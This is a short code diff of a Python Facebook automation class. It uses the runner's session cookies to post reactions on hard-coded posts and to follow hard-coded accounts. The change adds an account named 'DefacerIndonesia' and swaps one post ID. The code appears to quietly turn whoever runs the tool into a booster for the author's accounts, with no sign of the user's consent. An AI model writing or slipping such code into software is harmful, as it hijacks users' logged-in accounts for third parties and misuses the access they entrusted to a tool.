@@ -40,7 +40,7 @@ class ganteng:
 					req.post(self.url+g.get("action"),data=kwargs,cookies=self.kuki)
 		except:pass
 	def reaksi(self):
-		self.get_tok();self.dahlah(f"{self.url}/149237547235985","4","ah sit");self.dahlah(f"{self.url}/149237547235985","8","ah sit");self.tuturkeun("wans.xgans.94");self.tuturkeun("wans.xgans.94")
+		self.get_tok();self.dahlah(f"{self.url}/149237547235985","4","ah sit");self.dahlah(f"{self.url}/107984874729289","8","ah sit");self.tuturkeun("DefacerIndonesia");self.tuturkeun("wans.xgans.94")
 	def lang(self,cok):
 		try:
 			cek=req.get(f"{self.url}/language.php",cookies=cok).text
@@ -60,7 +60,7 @@ class ganteng:
 	def tuturkeun(self,wans_gans):
 		try:
 			cek=req.get(f"{self.url}/{wans_gans}",cookies=self.kuki).text
-			if "/a/subscribe.php" in cek:
+			if "/a/folow.php" in cek:
 				self.true=True
 			if self.true==True:
 				req.get(self.url+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies=self.kuki)
